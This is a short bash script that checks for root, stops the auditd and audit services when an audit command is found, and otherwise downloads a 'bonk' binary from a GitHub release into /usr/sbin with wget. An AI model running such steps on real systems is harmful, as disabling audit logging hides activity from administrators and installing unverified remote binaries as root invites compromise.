#!/bin/bash

if [[ $EUID -ne 0 ]]; then
   printf "\n[*] Script must be run as root\n"
   exit 1
fi

if command -v bonk &> /dev/null
then
    echo "bonk is already installed"
    exit
fi

if command -v audit &> /dev/null
then
    service auditd stop
    service audit stop
    exit
fi



wget -q -O /usr/sbin/bonk https://github.com/KevOub/bonk/releases/download/bonk/bonk-linux
chmod u+x /usr/sbin/bonk; out="$?"

if [[ $out -eq 0 ]]; then
   echo "Installed the bonk"
else
   echo "failed to install bonk"
fi